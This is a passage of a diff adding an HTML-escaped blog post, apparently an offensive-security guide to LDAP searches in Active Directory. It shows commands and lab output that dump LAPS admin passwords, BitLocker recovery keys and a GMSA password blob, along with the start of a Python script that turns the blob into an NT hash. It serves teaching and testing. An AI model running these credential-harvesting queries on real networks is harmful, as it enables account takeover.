+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;search: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;result: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; Success
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# numResponses: 2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# numEntries: 1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can learn the &lt;code&gt;dnsHostName&lt;/code&gt; of the LDAP server you pinged, the &lt;code&gt;dn&lt;/code&gt; which is useful for picking your base search if you don&amp;rsquo;t know it, the &lt;code&gt;domainFunctionality&lt;/code&gt; level (aka the &lt;a href=&#34;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/6dd88965-8feb-4369-ae7e-075985da8071&#34;&gt;Domain Functional Level&lt;/a&gt;) will give you a sense of what capabilities and GPOs can be set. The &lt;code&gt;supportedControl&lt;/code&gt; and &lt;code&gt;supportedCapabilities&lt;/code&gt; are more advanced topics, but these basically say what you can and can&amp;rsquo;t do on the server.&lt;/p&gt;
+&lt;h2 id=&#34;interesting-searches&#34;&gt;Interesting Searches&lt;/h2&gt;
+&lt;p&gt;The following are searches that I&amp;rsquo;ve found interesting or impactful in my experience.&lt;/p&gt;
+&lt;h3 id=&#34;laps-passwords&#34;&gt;LAPs Passwords&lt;/h3&gt;
+&lt;p&gt;This search will only show computers with LAPs enabled, and if you can read any passwords, what the password currently is.&lt;/p&gt;
+&lt;p&gt;Notice that this user can read every password except &lt;code&gt;SDLEGACY2K3&lt;/code&gt; and &lt;code&gt;SDEXCHANGE&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -LLL -h 192.168.80.10 -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dc=sittingduck,dc=info&amp;#34;&lt;/span&gt; -x -D &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sittingduck\uberuser&amp;#34;&lt;/span&gt; -w &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ASDqwe123&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;(ms-Mcs-AdmPwdExpirationtime=*)&amp;#39;&lt;/span&gt; ms-Mcs-AdmPwd
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;DC1,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Domain Controllers,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ms-Mcs-AdmPwd: f/0HG3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;7d5P+e;/IE5wW8I/o//5&lt;span style=&#34;color:#f92672&#34;&gt;)}&lt;/span&gt;W
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;SDCLIENT_DAWIN7,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LabComputers,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Lab,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ms-Mcs-AdmPwd: /B+%R26cVSA1c0zOi&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-Z/#n1Q2sA,,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;SDLEGACY2K3,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LabComputers,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Lab,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;SD_WSUS_2012,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LabComputers,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Lab,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ms-Mcs-AdmPwd: &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;b+BC@p,7&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;6pqxj3y&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;MxBm9@h9Hy-
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;SDEXCHANGE,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LabComputers,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Lab,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;WIN-PM0ID6F0AHN,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LabComputers,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Lab,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ms-Mcs-AdmPwd: &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;3-%AN574#&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;/%t55!S+0!/10OJC;V
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;DC2,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Domain Controllers,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ms-Mcs-AdmPwd: kMo,85&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;N&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uhUmWj183,3#T&amp;amp;d&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Aeddv
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;bitlocker-recovery-passwords&#34;&gt;BitLocker Recovery Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;src: &lt;a href=&#34;https://stackoverflow.com/a/50833203&#34;&gt;https://stackoverflow.com/a/50833203&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The key on this one is narrowing down the search base to a small list or a single computer. The reason this is important is that the Domain Controller you are asking the password from has to do a bunch of decryption to calculate this attribute on the fly, if you ask for too many (like every machine in the Domain) the connection will be closed out due to timeout.  Don&amp;rsquo;t be greedy, just get the one you need.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -h dc1.sittingduck.info -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=WIN10COMP1,OU=Workstations,DC=sittingduck,DC=info&amp;#34;&lt;/span&gt; msfve-recoverypassword
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;gmsa-nt-hash&#34;&gt;GMSA NT Hash&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;src: &lt;a href=&#34;https://stealthbits.com/blog/securing-gmsa-passwords/&#34;&gt;https://stealthbits.com/blog/securing-gmsa-passwords/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;src: &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket/pull/770&#34;&gt;https://github.com/SecureAuthCorp/impacket/pull/770&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Group Managed Service Accounts (GMSA) have randomly generated passwords that are default/generally pretty long. The &lt;code&gt;msDS-ManagedPassword&lt;/code&gt; in an at-runtime decrypted value that the Domain Controller has to construct in order to return, much like the BitLocker keys. However, unlike with BitLocker, generally there aren&amp;rsquo;t very many GMSAs so it&amp;rsquo;s less of a chance to knock over the DC if you get greedy and query them all.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ LDAPTLS_REQCERT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;never ldapsearch -LLL -H ldaps://192.168.80.10 -x -D uberuser -w ASDqwe123 -o ldif-wrap&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dc=sittingduck,dc=info&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;(&amp;amp;(ObjectClass=msDS-GroupManagedServiceAccount))&amp;#39;&lt;/span&gt; msDS-ManagedPassword
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;TestGMSA,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Managed Service Accounts,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-ManagedPassword:: AQAAACQCAAAQABIBFAIcAq/tlcA3PziSdtjxwKwcpM9VAteZa9No6et8yDWzgEYj5yFDhzT0OMFtTA4qAI4M+sWjiUVqYhDwFItW+5FlhaJp8tm/fcAfIDc5MAsYOXgq3AIc6ofCpeJga6Jw4SX/EKmnQdsS7lGmXd/yh27qJGj6SS0vwk//D8cr1+6s43YB0TxUxyLrruupZmd4Ndx2PZ4L4zkWa/vlRlDzadyeGwji70q9sfjH5x7+l7V+w5JK7/hKfG48swD8koEK/bHyLxZa8eDMEoscAmnuC/CA/pTvdF6jfIYmAYMGZujOVkbXJjaCEPGA1+nBDqkOQ1NlLZu4Y6Es1bB3YVIv6agDICYAAJ3USvAd5t267x9PfdetWSfLGRt4qxMCmOwXO0nVWMJTSYfjC+Phc0QX/rrTimPptYvx2NnuAclbgj0Fvg0iZfOvHW0SwdKTyKCvGeL+UPz4Jwr2VAd+PX43GoUPD8uBhDrtzVSwUhtScDIvzGJYgvHrREnTUqaf9pENqkVpbdXHtpE/buIphVrPEg84e9fgNB2a/r6sZaPX+1C8e/5pbNO7qoQ4fqXSDPM3qh6ymlh2ouNRoP0kN4sLVUvW+cNX+YQk7UJDSnG3fANPtgquhi6B4OVqU2fpypUbFtd91Ju/9xZeuod508FqYHPT1aX86tBdLj4yq2/65ROupERLVhAAADPE7gxzEgAAM2YeWnISAAA&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once you have this blob of text, you need to convert it into the NT hash using this tool:&lt;/p&gt;
+&lt;p&gt;(this is a slightly modified version of the script that &lt;a href=&#34;https://twitter.com/agsolino&#34;&gt;agsolino&lt;/a&gt; posted)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; impacket.structure &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; hexdump, Structure
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; getopt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Source from: https://github.com/SecureAuthCorp/impacket/pull/770#issuecomment-589243865&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MSDS_MANAGEDPASSWORD_BLOB&lt;/span&gt;(Structure):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    structure &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Version&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;H&amp;#39;&lt;/span&gt;),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Reserved&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;H&amp;#39;&lt;/span&gt;),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Length&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;L&amp;#39;&lt;/span&gt;),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CurrentPasswordOffset&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;H&amp;#39;&lt;/span&gt;),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PreviousPasswordOffset&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;H&amp;#39;&lt;/span&gt;),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;QueryPasswordIntervalOffset&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;H&amp;#39;&lt;/span&gt;),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UnchangedPasswordIntervalOffset&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;H&amp;#39;&lt;/span&gt;),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CurrentPassword&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PreviousPassword&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;#(&amp;#39;AlignmentPadding&amp;#39;,&amp;#39;:&amp;#39;),&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;QueryPasswordInterval&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UnchangedPasswordInterval&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Structure&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__init__(self, data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fromString&lt;/span&gt;(self, data):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Structure&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fromString(self,data)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PreviousPasswordOffset&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            endData &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;QueryPasswordIntervalOffset&amp;#39;&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            endData &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PreviousPasswordOffset&amp;#39;&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CurrentPassword&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rawData[self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CurrentPasswordOffset&amp;#39;&lt;/span&gt;]:][:endData &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CurrentPasswordOffset&amp;#39;&lt;/span&gt;]]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PreviousPasswordOffset&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PreviousPassword&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rawData[self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PreviousPasswordOffset&amp;#39;&lt;/span&gt;]:][:self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;QueryPasswordIntervalOffset&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PreviousPasswordOffset&amp;#39;&lt;/span&gt;]]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;QueryPasswordInterval&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rawData[self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;QueryPasswordIntervalOffset&amp;#39;&lt;/span&gt;]:][:self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UnchangedPasswordIntervalOffset&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;QueryPasswordIntervalOffset&amp;#39;&lt;/span&gt;]]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UnchangedPasswordInterval&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rawData[self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UnchangedPasswordIntervalOffset&amp;#39;&lt;/span&gt;]:]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(argv):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    b64 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    verbose &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        opts, args &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getopt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getopt(argv,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hvb:&amp;#34;&lt;/span&gt;,[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;base64=&amp;#34;&lt;/span&gt;])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; getopt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GetoptError:
